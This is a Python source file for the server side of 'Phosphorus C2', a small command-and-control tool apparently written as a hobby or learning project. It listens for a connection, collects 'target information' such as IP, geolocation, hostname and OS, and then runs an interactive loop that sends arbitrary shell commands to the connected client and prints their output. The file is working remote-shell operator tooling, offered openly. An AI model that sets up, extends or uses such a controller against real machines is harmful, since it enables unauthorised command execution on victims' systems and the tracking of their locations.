##############################################################################################################

# PHOSPHORUS C2
# Command & Control Server
# Brandon Burke
# Twitter = @Burke_Cyber

##############################################################################################################

# import: import libraries to use
from socket import *
from os import system as os_sys
from platform import system as plat_sys


# class: colors for colored-terminal output
class color:
    RED = '\033[91;1m'
    GREEN = '\033[92;1m'
    YELLOW = '\033[93;1m'
    BLUE = '\033[94;1m'
    CYAN = '\033[96;1m'
    CLEAR = '\033[0m'


# class: symbols for a more robust terminal output
class symbol:
    ERROR = '\u2717'
    WARNING = '\u0021'
    SUCCESS = '\u2713'


# function: banner to display the script's name and author
def banner():
    print('''
██████╗ ██╗  ██╗ ██████╗ ███████╗██████╗ ██╗  ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗     ██████╗██████╗
██╔══██╗██║  ██║██╔═══██╗██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔══██╗██║   ██║██╔════╝    ██╔════╝╚════██╗
██████╔╝███████║██║   ██║███████╗██████╔╝███████║██║   ██║██████╔╝██║   ██║███████╗    ██║      █████╔╝
██╔═══╝ ██╔══██║██║   ██║╚════██║██╔═══╝ ██╔══██║██║   ██║██╔══██╗██║   ██║╚════██║    ██║     ██╔═══╝
██║     ██║  ██║╚██████╔╝███████║██║     ██║  ██║╚██████╔╝██║  ██║╚██████╔╝███████║    ╚██████╗███████╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝     ╚═════╝╚══════╝

Developed By Brandon Burke @Burke_Cyber
''')


# function: instruction menu to inform the user on how to start / stop the server
def instruction_menu():
    print(f'{color.CYAN}PHOSPHORUS C2 Instruction Menu{color.CLEAR}')
    print(f'Type {color.CYAN}1{color.CLEAR} or {color.CYAN}start{color.CLEAR} to start the server.')
    print(f'Type {color.CYAN}2{color.CLEAR} or {color.CYAN}exit{color.CLEAR} at any point to stop the server.')
    print('')


# function: listen for a connection from the client
def listen():

    # variable: define HOST, PORT, ADDRESS, & BUFFER
    HOST = 'localhost'
    PORT = 9999
    ADDRESS = HOST, PORT
    BUFFER = 4096

    # variable: define server, bind to ADDRESS, & listen for incoming connections
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(ADDRESS)
    server.listen(1)
    print(f'{color.GREEN}[{symbol.SUCCESS}]{color.CLEAR} Listening on {color.CYAN}{HOST}:{PORT}{color.CLEAR}.')

    # variable: define client_socket, client_addr, & accept the incoming connections
    client_socket, client_addr = server.accept()
    print(f'{color.GREEN}[{symbol.SUCCESS}]{color.CLEAR} Received a connection from {color.CYAN}{client_addr[0]}:{client_addr[1]}{color.CLEAR}.')

    # return: return client_socket, client_addr, & BUFFER for other functions to use
    return client_socket, client_addr, BUFFER


# function: receive target information such as IP, country, region, city, lat, long, hostname, & platform (OS)
def target_info(client_socket, BUFFER):

    # variable: receive client information & print to the terminal
    t_info = client_socket.recv(BUFFER).decode()
    print(f'\n{color.CYAN}Client Information{color.CLEAR}\n')
    print(t_info)


# function: send commands to the client
def send_command(client_socket, client_addr):

    # variable: define client_addr with slicing & insert into the command variable for input
    client_addr = client_addr[0]
    command = input(f'{color.BLUE}[SHELL@{client_addr}]{color.CLEAR} >> ').strip()

    # if else: if the command is 'exit' or '2', then send the command to the client to close the connection
    # if else: elif the command is empty or '', then send 'exit' to the client
    # if else: else send the command normally to the client to execute
    if command == 'exit' or command == '2':
        command = command.encode()
        client_socket.send(command)
        print(f'{color.YELLOW}[{symbol.WARNING}]{color.CLEAR} Client disconnected.')
        print(f'{color.RED}[{symbol.ERROR}]{color.CLEAR} Stopping server.')
        exit()

    elif not command or command == '':
        command = 'exit'.encode()
        client_socket.send(command)
    
    else:
        command = command.encode()
        client_socket.send(command)


# function: receive output from the executed commands on the client
def receive_info(client_socket, BUFFER):

    # variable: decode the command_output from the client
    command_output = client_socket.recv(BUFFER).decode().strip()
    
    # if else: if the command is empty, then stop the server
    # if else: else print the command to the terminal
    if not command_output:
        print(f'{color.YELLOW}[{symbol.WARNING}]{color.CLEAR} Client disconnected.')
        print(f'{color.RED}[{symbol.ERROR}]{color.CLEAR} Stopping server.')
        exit()
    
    else:
        print(command_output)


# function: check the platform (OS) the server is running on and clear the screen
def check_system():

    # variable: define oSystem to check for operating system
    oSystem = plat_sys()
    
    # if else: if the oSystem is 'Windows', execute 'cls' to clear the terminal
    # if else: elif oSystem is 'Darwin' (macOS) or 'Linux', execute 'clear' to clear the terminal
    # if else: else print the system if not compatible & stop the server
    if oSystem == 'Windows':
        os_sys('cls')

    elif oSystem == 'Darwin' or oSystem == 'Linux':
        os_sys('clear')

    else:
        print(f'{color.RED}[{symbol.ERROR}]{color.CLEAR} Unsupported platform.')
        exit()


# function: run all functions above
def main():

    # function: run the check_system() function
    check_system()
    
    # function: run the banner() function
    banner()
    
    # function: run the instruction_menu() function
    instruction_menu()
    
    # loop: while loop to ask for user input
    while True:

        # variable: define choice to ask for user input
        choice = input(f'{color.BLUE}[CHOICE]{color.CLEAR} >> ').strip().lower()

        # if else: if choice is '1' or 'start', start the server & break from the loop
        # if else: elif choice is '2' or 'exit' stop the server
        # if else: tell the user to input a valid option & re-run the loop
        if choice == '1' or choice == 'start':
            print(f'{color.GREEN}[{symbol.SUCCESS}]{color.CLEAR} Starting server.')
            break
        
        elif choice == '2' or choice == 'exit':
            print(f'{color.RED}[{symbol.ERROR}]{color.CLEAR} Stopping server.')
            exit()
        
        else:
            print(f'{color.YELLOW}[{symbol.WARNING}]{color.CLEAR} Enter a valid option.')
 
    # variable: define client_socket, client_addr, & BUFFER returned from function & pass into target_info(), send_command(), & receive_info()
    client_socket, client_addr, BUFFER = listen()
    target_info(client_socket, BUFFER)
    
    # loop: while loop to constantly send commands & receive output from the client
    while True:
        send_command(client_socket, client_addr)
        receive_info(client_socket, BUFFER)


# call the main function
if __name__ == '__main__':
    main()
